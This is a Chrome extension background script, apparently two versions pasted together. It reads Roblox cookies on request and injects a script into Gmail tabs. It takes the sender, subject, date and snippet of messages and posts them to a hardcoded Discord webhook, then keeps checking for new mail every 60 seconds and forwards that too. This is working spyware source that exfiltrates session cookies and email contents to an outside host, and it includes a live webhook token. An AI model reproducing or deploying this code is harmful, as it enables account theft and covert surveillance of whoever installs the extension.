// background.js

// Listener for incoming messages from other parts of the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    // Handle cookie retrieval
    if (request.action === 'getCookie') {
        const cookieName = request.name;
        const url = 'https://www.roblox.com/';

        chrome.cookies.get({ url: url, name: cookieName }, (cookie) => {
            if (cookie) {
                sendResponse({
                    cookieExists: true,
                    cookieName: cookieName,
                    cookieValue: cookie.value
                });
            } else {
                sendResponse({
                    cookieExists: false,
                    error: `Cookie "${cookieName}" not found.`
                });
            }
        });

        // Indicate that the response is asynchronous
        return true;
    }

    // Handle sending emails to Discord
    if (request.action === 'sendEmailsToDiscord') {
        const emailContents = request.data; // Expecting an array of email strings

        sendEmailsToDiscord(emailContents)
            .then(() => {
                sendResponse({ status: "Emails sent to Discord successfully!" });
            })
            .catch((error) => {
                console.error("Error sending emails to Discord:", error);
                sendResponse({ status: "Failed to send emails to Discord.", error: error.message });
            });

        // Indicate that the response is asynchronous
        return true;
    }
});

// background.js

let monitoringIntervalId = null;

// Listener for incoming messages from other parts of the extension
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'sendEmailsToDiscord') {
        console.log('Received request to send emails to Discord');

        // Query all Gmail tabs
        chrome.tabs.query({ url: 'https://mail.google.com/*' }, async (tabs) => {
            try {
                if (tabs.length === 0) {
                    throw new Error('No Gmail tabs found.');
                }

                // Use the first Gmail tab for processing
                const tab = tabs[0];
                console.log(`Processing tab ID: ${tab.id}`);

                // Inject content script into the Gmail tab if not already injected
                await injectContentScript(tab.id);

                // Extract all emails initially
                const response = await new Promise((resolve, reject) => {
                    chrome.tabs.sendMessage(
                        tab.id,
                        { action: 'extractAllEmails' },
                        (response) => {
                            if (chrome.runtime.lastError) {
                                reject(new Error(chrome.runtime.lastError.message));
                                return;
                            }
                            resolve(response);
                        }
                    );
                });

                console.log('Response from content script:', response);

                const emails = response?.emails;
                if (!emails || !Array.isArray(emails) || emails.length === 0) {
                    throw new Error('No emails found or invalid data format');
                }

                const validEmails = emails
                    .filter(email => email.from && email.subject && email.date && email.snippet)
                    .slice(0, 5);

                if (validEmails.length === 0) {
                    throw new Error('All extracted emails are invalid.');
                }

                const lastSentDate = validEmails[0]?.date || new Date().toISOString();
                chrome.storage.local.set({ lastSentDate });

                await sendEmailsToDiscord(validEmails);
                console.log('First batch of emails sent to Discord successfully!');
                sendResponse({ status: "Emails sent to Discord successfully!", success: true });

                // Start monitoring for new emails
                startMonitoringNewEmails(tab.id);

            } catch (error) {
                console.error('Error in email processing:', error.message);
                sendResponse({
                    status: `Failed to process emails: ${error.message}`,
                    success: false
                });
            }
        });

        return true;
    }
});

async function injectContentScript(tabId) {
    try {
        await chrome.scripting.executeScript({
            target: { tabId: tabId },
            files: ['content.js']
        });
        console.log('Content script injected successfully.');
    } catch (error) {
        console.error('Error injecting content script:', error);
    }
}

function startMonitoringNewEmails(tabId) {
    const checkInterval = 60000; // Check every 60 seconds

    // Clear any existing interval to prevent multiple intervals running
    if (monitoringIntervalId) {
        clearInterval(monitoringIntervalId);
    }

    monitoringIntervalId = setInterval(async () => {
        try {
            chrome.storage.local.get(['lastSentDate'], async (result) => {
                let lastSentDate = result.lastSentDate || new Date(0).toISOString();

                const response = await new Promise((resolve, reject) => {
                    chrome.tabs.sendMessage(
                        tabId,
                        { action: 'extractNewEmails', lastSentDate },
                        (response) => {
                            if (chrome.runtime.lastError) {
                                console.error('Error sending message to content script:', chrome.runtime.lastError.message);
                                reject(new Error(chrome.runtime.lastError.message));
                                return;
                            }
                            resolve(response);
                        }
                    );
                });

                console.log('Response from content script for new emails:', response);

                const emails = response?.emails || [];
                const newEmails = emails
                    .filter(email => email.from && email.subject && email.date && email.snippet);

                if (newEmails.length > 0) {
                    await sendEmailsToDiscord(newEmails);
                    console.log('New emails sent to Discord successfully!');
                    // Update lastSentDate to the most recent email
                    lastSentDate = newEmails[0].date;
                    chrome.storage.local.set({ lastSentDate });
                } else {
                    console.log('No new emails found.');
                }
            });
        } catch (error) {
            console.error('Error in checking new emails:', error.message);
        }
    }, checkInterval);
}

async function sendEmailsToDiscord(emailContents) {
    const webhookUrl = 'https://discord.com/api/webhooks/1300858799833350245/xy-KcPw8eDKi6dMYveiJ7CZeuHbgBiuCFBwLHverjtfETcjMKbm7tCF1UvO9NhKef6KR';

    if (!emailContents || !Array.isArray(emailContents) || emailContents.length === 0) {
        throw new Error('Invalid email content format');
    }

    for (const email of emailContents) {
        if (!email || !email.from || !email.subject || !email.date || !email.snippet) {
            console.warn('Skipping invalid email object:', email);
            continue;
        }

        const limitedSnippet = email.snippet.length > 200 ? email.snippet.substring(0, 197) + '...' : email.snippet;

        const payload = {
            content: `📧 **Email Retrieved**\n**From:** ${sanitizeText(email.from)}\n**Subject:** ${sanitizeText(email.subject)}\n**Date:** ${sanitizeText(email.date)}\n**Snippet:** ${sanitizeText(limitedSnippet)}`
        };

        try {
            console.log("Attempting to send email to Discord:", payload);
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                const responseBody = await response.text();
                throw new Error(`Discord API returned status: ${response.status}, body: ${responseBody}`);
            }

            console.log('Email sent to Discord successfully');
            // Wait 1 second between messages to prevent rate limiting
            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (error) {
            console.error('Error sending email to Discord:', error);
        }
    }
}

function sanitizeText(text) {
    if (typeof text !== 'string') return '';
    return text.replace(/`/g, '\\`').replace(/@/g, '@\u200B').replace(/\n/g, ' ').trim();
}